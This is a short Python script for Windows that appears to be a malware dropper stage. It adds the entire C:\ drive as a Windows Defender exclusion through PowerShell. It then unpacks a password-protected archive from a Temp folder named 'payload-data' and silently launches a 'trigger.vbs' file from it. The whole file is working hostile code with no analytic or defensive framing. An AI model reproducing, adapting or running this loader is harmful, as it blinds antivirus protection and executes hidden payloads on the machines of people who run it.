import subprocess
from time import sleep
from os import system, path

sleep(3)
home = path.expanduser('~')

system(fr'powershell -c "Add-MpPreference -ExclusionPath \"C:\\\"')
system(fr'{home}\AppData\Local\Temp\payload-data\data\7z2107-extra\7za.exe x "{home}\AppData\Local\Temp\payload-data\data\data.7z" -p"phoenixthrush" -o./container -y')

trigger = fr'{home}\AppData\Local\Temp\payload-data\data\container\trigger.vbs'
subprocess.Popen([trigger],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True).communicate()

exit()